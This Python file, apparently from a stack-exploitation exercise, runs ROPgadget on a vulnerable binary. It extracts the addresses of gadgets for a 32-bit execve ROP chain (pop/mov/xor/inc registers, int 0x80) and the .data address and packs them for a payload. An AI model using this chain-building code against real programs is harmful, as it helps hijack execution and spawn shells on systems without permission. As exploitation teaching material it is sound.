import subprocess
import struct
import re
from struct import pack
import sys

def find_gadgets (vulnerable_program):
    ROPgadget_call = ["ROPgadget","--binary" ,f"{vulnerable_program}", "--ropchain"]
    
    # run a call through subrocess to get the according gadgetfile

    try:
        result = subprocess.run(ROPgadget_call, capture_output=True, text=True, check=True)
        ropchain_output = result.stdout

        # for testing save to a file called ropchain.txt
        with open("ropchain.txt", "w") as f:
            f.write(ropchain_output)
        # print("ROP chain generated and saved to ropchain.txt")
    except subprocess.CalledProcessError as e:
        print(f"Error running ROPgadget: {e}")
        sys.exit(1)

def extract_gadgets():
    with open("ropchain.txt", "r") as f:
        ropchain_data = f.read()

    # Dictionary to store found gadgets: { "instruction string" : address_integer }
    gadget_map = {}

    # Regex to capture Address and Instruction
    # Matches: [+] Gadget found: 0x080484a0 pop edx ; ret
    gadget_re = re.compile(r'\[\+\] Gadget found: (0x[0-9a-fA-F]+)\s+(.+)')
    
    for match in gadget_re.finditer(ropchain_data):
        addr_str, instruction = match.groups()
        address = int(addr_str, 16)
        
        # Store in map (Strip whitespace to be safe)
        # If a gadget appears twice, this just updates it with the same/new address (both are valid)
        gadget_map[instruction.strip()] = address
    print(gadget_map)



    # --- Retrieve Specific Gadgets by Name ---
    try:
        # 1. MOV [EDX], EAX
        addr_mov = gadget_map['mov dword ptr [edx], eax ; ret']
        MOVISTACK = pack("<I", addr_mov)

        # 2. POP EDX 
        addr_pop_edx = gadget_map['pop edx ; ret']
        POPEDX = pack("<I", addr_pop_edx)

        # 3. POP EAX
        addr_pop_eax = gadget_map['pop eax ; ret']
        POPEAX = pack("<I", addr_pop_eax)

        # 4. XOR EAX
        addr_xor = gadget_map['xor eax, eax ; ret']
        XOREAX = pack("<I", addr_xor)

        # 5. INC EAX
        addr_inc = gadget_map['inc eax ; ret']
        INCEAX = pack("<I", addr_inc)

        # 6. POP EBX
        addr_pop_ebx = gadget_map['pop ebx ; ret']
        POPEBX = pack("<I", addr_pop_ebx)

        # 7. POP ECX (Dirty)
        addr_pop_ecx = gadget_map['pop ecx ; pop ebx ; ret'] 
        POPECX = pack("<I", addr_pop_ecx)

        # 8. INT 0x80
        addr_int80 = gadget_map['int 0x80']
        INT80 = pack("<I", addr_int80)

    except KeyError as e:
        print(f"CRITICAL ERROR: Could not find gadget for instruction: {e}")
        print("Check ropchain.txt to see if the wording is slightly different.")
        sys.exit(1)

    # --- Get .data Address ---
    data_re = re.compile(r"0x([0-9a-fA-F]+)\)\s*# @ \.data")
    m = data_re.search(ropchain_data)
    if not m:
        print("Error: .data address not found in ropchain.txt")
        sys.exit(1)
    
    data_addr = int(m.group(1), 16)
    STACK = pack("<I", data_addr)
    
    # Padding
    DUMMY = pack("<I", 0x42424242)

    
    return MOVISTACK, POPEDX, POPEAX, XOREAX, INCEAX, POPEBX, POPECX, INT80, STACK, DUMMY
